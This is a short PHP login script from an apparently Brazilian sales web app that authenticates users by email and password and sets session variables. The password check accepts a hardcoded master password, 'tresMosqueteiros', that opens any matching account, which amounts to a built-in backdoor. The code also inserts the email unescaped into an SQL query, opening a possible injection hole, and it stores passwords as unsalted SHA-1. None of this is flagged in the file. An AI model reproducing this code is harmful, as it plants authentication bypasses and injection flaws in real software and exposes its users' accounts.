<?php
$user = strtoupper(strps('emailLogin'));
$senha = strpr('passLogin');
$pass = sha1($senha);
$master = sha1('tresMosqueteiros');

$User = $b->query("select * from Usuarios where email='$user' and id_perfil=4 limit 1");

if($User->rowCount())$rs = $User->fetchObject();

if(!$user)$x->m = 'Digite o e-mail!';
elseif(!$pass)$x->m = 'Digite a senha!';
elseif($rs){
	if($rs->status!=1)$x->m = 'Usuário desativado pelo Administrador!';
	elseif($rs->senha==$pass||$master==$pass){
		$s->idc = $_SESSION['idc'] = $rs->id_usuario+0;
		$s->nome = $_SESSION['nome'] = $rs->nome;
		$s->user = $_SESSION['user'] = $rs->email;
		$s->tipo= $_SESSION['tipo'] = $rs->id_perfil+0;
		$s->timeout = $_SESSION['timeout'] = time();
		$x->l ='vendedor';
	}else $x->m = 'Senha inválida!';
	
}else $x->m = 'Usuário inexistente!';
